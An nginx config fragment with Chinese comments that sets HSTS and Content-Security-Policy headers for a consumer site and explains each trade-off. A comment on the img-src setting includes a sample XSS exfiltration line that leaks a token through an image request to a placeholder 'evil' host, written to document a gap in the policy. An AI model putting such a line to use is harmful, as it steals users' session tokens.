# C 端站点（:80）的安全响应头 = 通用四件套 + C 端 CSP。
# 凡是自己加了 add_header 的 location 都要 include 本片段，否则该 location 会丢掉
# server 层继承的全部 add_header（nginx add_header 的继承规则）。
include /etc/nginx/conf.d/_sec.inc;

# HSTS（2026-08-18 域名成为正式入口后开启）。放在本片段而非 _tls.inc，是因为 `location /`
# 与 `/_next/static/` 自带 add_header、会丢掉 server 层继承的头，而它们正是 HTML 响应的出口。
# 明文 :80 的 server 也会发这一条，浏览器按规范**忽略非 TLS 上的 HSTS**，故无害。
# max-age 先给 30 天而不是常见的 1 年：本证书**手动续期**（2027-03-04 到期），一旦漏续，
# 长 max-age 会把访问过的浏览器长期锁死在打不开的 https 上，连临时降回 http 都做不到。
# 不带 includeSubDomains/preload：子域（将来的 admin.）还没上 TLS，别提前替它们承诺。
add_header Strict-Transport-Security "max-age=2592000" always;

# CSP（2026-08-05 安全测试报告项）。指令含义与取舍见 _sec-admin.inc，此处只记与后台的差异。
#
# img-src 多一个 https:——支付二维码是收钱吧下单接口回的 qr_code_image_url，指向他们的图床，
# 域名不固定且下单响应不落库，无法预先精确到域；乱猜一个域会在真实支付时把二维码打没。
# 代价要说清楚：img-src 放开 https: 后 `new Image().src='https://evil/?t='+token` 这条外带通道
# 仍然存在，本站的 CSP 对「XSS 外带」只挡住了 fetch/XHR（connect-src），没挡住图片外带。
# 收紧办法有两条，都要改代码，故未在本次做：把二维码图片改成经我们自己的源代理（同 /s3/ 的做法），
# 或下单时由 App 侧取回图片转 data: URI。做完任一条即可把 img-src 收成与后台一致。
#
# 其余方向与后台同样收紧：上传/下载走同源 /s3/ 代理（MINIO_PROXY_PREFIX=/s3），
# 支付是扫码不跳转外部网关（form-action 'self' 安全），全站无 iframe（frame-ancestors 'none' 安全）。
# 微信扫码登录要放行两个微信域（2026-08-18 上域名后接微信开放平台）：
#   script-src res.wx.qq.com  → 官方 wxLogin.js（登录页按需加载，见 web/lib/wechat-login.ts）
#   frame-src open.weixin.qq.com → 二维码本体是该域的 iframe，不放行则整块空白且只在控制台报 CSP
# 二维码 iframe 内部的资源受它自己的源约束，与本站 CSP 无关，故只需这两条。
add_header Content-Security-Policy "default-src 'self'; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; script-src 'self' 'unsafe-inline' https://res.wx.qq.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self'; frame-src https://open.weixin.qq.com; worker-src 'self' blob:; media-src 'self' blob:" always;
